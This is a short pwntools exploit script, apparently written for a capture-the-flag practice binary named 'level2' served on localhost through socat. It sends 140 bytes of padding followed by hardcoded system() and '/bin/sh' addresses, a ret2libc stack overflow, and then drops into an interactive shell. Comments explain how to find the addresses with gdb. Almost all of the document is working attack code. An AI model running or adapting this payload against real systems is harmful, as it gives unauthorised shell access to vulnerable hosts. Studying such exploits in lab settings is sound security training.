from pwn import *
# p = process('./level2')
# socat TCP4-LISTEN:10002,fork EXEC:./level2
p = remote('127.0.0.1',10002)
# local 
system_addr = 0xf7e3cda0 
binsh_addr = 0xf7f5d9ab 
# remote 
# sudo gdb attach $(pidof level1)
# x/s $esp to get stack address
payload = 'B'*140 + p32(system_addr) + p32(0xdeadbeaf) + p32(binsh_addr) 
p.sendline(payload)
p.interactive()
